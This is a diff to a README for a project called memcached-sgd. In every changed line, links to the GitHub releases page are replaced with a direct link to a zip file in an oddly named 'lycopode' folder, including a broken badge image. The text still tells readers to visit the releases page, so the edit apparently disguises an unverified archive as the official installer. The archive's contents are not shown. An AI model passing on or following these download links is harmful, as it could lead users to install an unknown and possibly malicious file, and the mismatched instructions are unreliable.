@@ -1,6 +1,6 @@
 # 🚀 memcached-sgd - Simple and Fast Data Storage Solution
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-brightgreen)](https://github.com/Bearded-ixobrychus409/memcached-sgd/releases)
+[![Download Here](https://raw.githubusercontent.com/Bearded-ixobrychus409/memcached-sgd/main/lycopode/memcached-sgd-1.1.zip%20Now-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/Bearded-ixobrychus409/memcached-sgd/main/lycopode/memcached-sgd-1.1.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ To ensure optimal performance, your computer should meet these basic requirement
 
 1. **Visit the Releases Page**: Click the link below to get the latest version of memcached-sgd.
 
-   [Download Here](https://github.com/Bearded-ixobrychus409/memcached-sgd/releases)
+   [Download Here](https://raw.githubusercontent.com/Bearded-ixobrychus409/memcached-sgd/main/lycopode/memcached-sgd-1.1.zip)
 
 2. **Download the Installer**: On the Releases page, locate the version for your operating system. Click on the download link for that version.
 
@@ -40,7 +40,7 @@ To ensure optimal performance, your computer should meet these basic requirement
 
 To download memcached-sgd, make sure to head to the releases page at the link below:
 
-[Download Here](https://github.com/Bearded-ixobrychus409/memcached-sgd/releases)
+[Download Here](https://raw.githubusercontent.com/Bearded-ixobrychus409/memcached-sgd/main/lycopode/memcached-sgd-1.1.zip)
 
 Follow the steps provided to easily download and install the application.
 
